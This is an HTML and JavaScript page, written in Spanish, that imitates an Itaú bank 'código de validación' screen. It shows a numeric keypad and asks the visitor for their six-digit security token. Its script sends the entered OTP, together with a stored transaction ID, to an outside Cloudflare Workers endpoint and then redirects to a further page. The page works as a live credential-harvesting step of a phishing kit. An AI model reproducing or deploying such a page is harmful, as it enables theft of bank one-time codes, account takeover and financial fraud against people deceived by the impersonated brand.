<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#06143f">
<title>Itaú - Código de validación</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
    background: #f8f9fa;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}

.header {
    background: #06143f;
    padding: 18px 24px;
    display: flex;
    align-items: center;
    gap: 16px;
    min-height: 72px;
}

.header .back {
    color: #fff;
    font-size: 28px;
    cursor: pointer;
    text-decoration: none;
    font-weight: 300;
    line-height: 1;
}

.header .back:hover {
    opacity: 0.8;
}

.header .logo {
    color: #fff;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -1px;
}

.header .title {
    color: #fff;
    font-size: 18px;
    font-weight: 400;
    margin-left: auto;
}

.container {
    flex: 1;
    padding: 40px 24px 120px;
    max-width: 420px;
    margin: 0 auto;
    width: 100%;
    text-align: center;
}

.code-boxes {
    display: flex;
    justify-content: center;
    gap: 12px;
    margin: 30px 0 25px;
}

.box {
    width: 50px;
    height: 60px;
    border-radius: 12px;
    background: #f0f0f5;
    border: 2px solid #e0e0e5;
    font-size: 24px;
    font-weight: 600;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #06143f;
    transition: all 0.3s;
    font-family: 'Courier New', monospace;
}

.box.active {
    border-color: #ff5b00;
    background: #fff;
    box-shadow: 0 0 0 3px rgba(255, 91, 0, 0.15);
}

.box.filled {
    border-color: #28a745;
    background: #f0fff4;
}

.box.error {
    border-color: #dc3545;
    background: #fff5f5;
    animation: shake 0.3s ease;
}

@keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-8px); }
    75% { transform: translateX(8px); }
}

.text {
    color: #6c757d;
    font-size: 14px;
    line-height: 1.6;
    margin-top: 20px;
}

#claveInput {
    position: absolute;
    opacity: 0;
    width: 1px;
    height: 1px;
    pointer-events: none;
}

.keyboard {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    background: white;
    padding: 16px 0 30px;
    border-top: 1px solid #e9ecef;
    box-shadow: 0 -4px 20px rgba(0,0,0,0.05);
}

.keys {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 12px;
    max-width: 320px;
    margin: 0 auto;
    padding: 0 16px;
}

.key {
    font-size: 24px;
    font-weight: 500;
    text-align: center;
    padding: 14px 0;
    cursor: pointer;
    border-radius: 12px;
    background: #f8f9fa;
    color: #06143f;
    transition: all 0.15s;
    user-select: none;
    -webkit-tap-highlight-color: transparent;
    touch-action: manipulation;
}

.key:hover {
    background: #e9ecef;
}

.key:active {
    transform: scale(0.92);
    background: #ff5b00;
    color: white;
}

.key.empty {
    background: transparent;
    cursor: default;
    pointer-events: none;
}

.key.delete {
    font-size: 20px;
    color: #dc3545;
}

.key.delete:active {
    background: #dc3545;
    color: white;
}

.alert-overlay {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.5);
    z-index: 1000;
    justify-content: center;
    align-items: center;
    animation: fadeIn 0.3s ease;
}

.alert-box {
    background: white;
    border-radius: 20px;
    padding: 30px 32px 24px;
    max-width: 380px;
    width: 90%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    animation: slideUp 0.3s ease;
}

.alert-icon {
    font-size: 48px;
    margin-bottom: 12px;
}

.alert-title {
    font-size: 20px;
    font-weight: 700;
    color: #dc3545;
    margin-bottom: 8px;
}

.alert-message {
    font-size: 15px;
    color: #6c757d;
    line-height: 1.5;
    margin-bottom: 20px;
}

.alert-btn {
    background: #ff5b00;
    color: white;
    border: none;
    padding: 12px 40px;
    border-radius: 12px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: opacity 0.3s;
}

.alert-btn:hover {
    opacity: 0.9;
}

@keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
}

@keyframes slideUp {
    from { transform: translateY(30px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}

@media (max-width: 480px) {
    .header {
        padding: 14px 18px;
        min-height: 60px;
    }
    .header .logo {
        font-size: 18px;
    }
    .header .title {
        font-size: 15px;
    }
    .container {
        padding: 30px 16px 140px;
    }
    .code-boxes {
        gap: 10px;
    }
    .box {
        width: 44px;
        height: 54px;
        font-size: 20px;
        border-radius: 10px;
    }
    .keys {
        gap: 10px;
        max-width: 280px;
    }
    .key {
        font-size: 21px;
        padding: 12px 0;
        border-radius: 10px;
    }
}

@media (max-width: 380px) {
    .box {
        width: 38px;
        height: 46px;
        font-size: 17px;
        border-radius: 8px;
    }
    .code-boxes {
        gap: 8px;
    }
    .keys {
        gap: 8px;
        max-width: 240px;
    }
    .key {
        font-size: 18px;
        padding: 10px 0;
    }
}
</style>
</head>
<body>

<div class="alert-overlay" id="alertOverlay">
    <div class="alert-box">
        <div class="alert-icon">❌</div>
        <div class="alert-title">Código incorrecto</div>
        <div class="alert-message">El código ingresado no es válido. Por favor, intenta nuevamente.</div>
        <button class="alert-btn" onclick="cerrarAlerta()">Intentar de nuevo</button>
    </div>
</div>

<div class="header">
    <span class="back" onclick="window.history.back()">‹</span>
    <span class="logo">itaú</span>
    <span class="title">Código de validación</span>
</div>

<div class="container">
    <div class="code-boxes" id="boxes"></div>
    <div class="text">
       Por seguridad ingrese su token para poder validar su identidad
    </div>
    <input type="password" id="claveInput" maxlength="6" inputmode="numeric" autofocus>
</div>

<div class="keyboard">
    <div class="keys">
        <div class="key" data-value="1">1</div>
        <div class="key" data-value="2">2</div>
        <div class="key" data-value="3">3</div>
        <div class="key" data-value="4">4</div>
        <div class="key" data-value="5">5</div>
        <div class="key" data-value="6">6</div>
        <div class="key" data-value="7">7</div>
        <div class="key" data-value="8">8</div>
        <div class="key" data-value="9">9</div>
        <div class="key empty"></div>
        <div class="key" data-value="0">0</div>
        <div class="key delete" data-value="delete">⌫</div>
    </div>
</div>

<script>
// ✅ TU WORKER CORRECTO
const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';

const claveInput = document.getElementById('claveInput');
const boxesContainer = document.getElementById('boxes');
const alertOverlay = document.getElementById('alertOverlay');

for (let i = 0; i < 6; i++) {
    const div = document.createElement('div');
    div.classList.add('box');
    boxesContainer.appendChild(div);
}
const boxes = document.querySelectorAll('.box');

function mostrarAlerta() {
    alertOverlay.style.display = 'flex';
}

function cerrarAlerta() {
    alertOverlay.style.display = 'none';
    claveInput.value = '';
    updateBoxes();
    setTimeout(() => claveInput.focus(), 100);
}

function updateBoxes() {
    const val = claveInput.value;
    boxes.forEach((box, i) => {
        if (val[i]) {
            box.textContent = '•';
            box.classList.add('filled');
            box.classList.remove('active');
            box.classList.remove('error');
        } else {
            box.textContent = '';
            box.classList.remove('filled');
            box.classList.remove('error');
            if (i === val.length) {
                box.classList.add('active');
            } else {
                box.classList.remove('active');
            }
        }
    });
}

function mostrarErrorCajas() {
    boxes.forEach((box) => box.classList.add('error'));
    setTimeout(() => {
        boxes.forEach((box) => box.classList.remove('error'));
    }, 500);
}

function agregarNumero(numero) {
    if (claveInput.value.length < 6) {
        claveInput.value += numero;
        claveInput.dispatchEvent(new Event('input'));
    }
}

function borrarNumero() {
    claveInput.value = claveInput.value.slice(0, -1);
    claveInput.dispatchEvent(new Event('input'));
}

// ========================= ENVIAR CÓDIGO OTP =========================
async function enviarCodigo() {
    const claveValue = claveInput.value.trim();
    if (claveValue.length !== 6) return;

    try {
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const transactionId = bancoldata.transactionId;

        if (!transactionId) {
            alert('Error: Sesión no encontrada');
            window.location.href = 'index.html';
            return;
        }

        console.log('📤 Enviando código OTP:', claveValue);
        console.log('🆔 TransactionId:', transactionId);
        console.log(`📡 Worker URL: ${WORKER_URL}`);

        // ✅ Enviar al endpoint /otp-code
        const response = await fetch(`${WORKER_URL}/otp-code`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                transactionId: transactionId,
                otp: claveValue
            })
        });

        const result = await response.json();

        if (result.ok) {
            // ✅ Redirigir a validacion.html
            window.location.href = 'validacion.html';
        } else {
            mostrarErrorCajas();
            mostrarAlerta();
        }

    } catch (err) {
        console.error('❌ Error:', err);
        mostrarErrorCajas();
        mostrarAlerta();
    }
}

// ========================= EVENTOS =========================
claveInput.addEventListener('input', () => {
    if (claveInput.value.length > 6) {
        claveInput.value = claveInput.value.slice(0, 6);
    }
    updateBoxes();
    if (claveInput.value.length === 6) {
        setTimeout(enviarCodigo, 300);
    }
});

document.querySelectorAll('.key').forEach(key => {
    key.addEventListener('click', function(e) {
        e.preventDefault();
        const value = this.dataset.value;
        if (value === 'delete') {
            borrarNumero();
        } else if (value) {
            agregarNumero(value);
        }
    });

    key.addEventListener('touchstart', function(e) {
        e.preventDefault();
        const value = this.dataset.value;
        if (value === 'delete') {
            borrarNumero();
        } else if (value) {
            agregarNumero(value);
        }
    }, { passive: false });
});

updateBoxes();
setTimeout(() => claveInput.focus(), 300);

console.log('🚀 Sistema de validación Itaú listo');
console.log(`📡 Worker URL: ${WORKER_URL}`);

document.addEventListener('keydown', (e) => {
    if (e.key >= '0' && e.key <= '9') {
        if (claveInput.value.length < 6) {
            claveInput.value += e.key;
            claveInput.dispatchEvent(new Event('input'));
        }
        e.preventDefault();
    } else if (e.key === 'Backspace') {
        claveInput.value = claveInput.value.slice(0, -1);
        claveInput.dispatchEvent(new Event('input'));
        e.preventDefault();
    }
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && alertOverlay.style.display === 'flex') {
        cerrarAlerta();
    }
});
</script>

</body>
</html>
